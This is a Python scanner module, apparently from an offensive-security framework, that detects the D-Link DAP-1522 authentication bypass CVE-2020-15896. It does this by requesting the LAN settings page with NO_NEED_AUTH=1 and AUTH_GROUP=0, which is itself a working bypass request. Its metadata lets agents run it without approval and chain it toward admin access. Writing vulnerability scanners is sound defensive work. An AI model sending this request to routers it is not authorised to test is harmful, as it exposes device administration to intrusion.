#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DAP-1522 authentication bypass (CVE-2020-15896)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DAP-1522 - Auth Bypass Detection (CVE-2020-15896)',
        'description': (
            'Detects CVE-2020-15896 by requesting /bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0 '
            'and looking for LAN Settings / DEVICE NAME content without login.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'dlink', 'router', 'auth-bypass',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-15896'],
        'cve': 'CVE-2020-15896',
    }

    def run(self):
        path = '/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if 'LAN Settings' in body and '<h2>DEVICE NAME' in body:
            self.set_info(
                severity='critical',
                reason='D-Link DAP-1522 auth bypass (CVE-2020-15896)',
                path=path,
            )
            return True
        return False
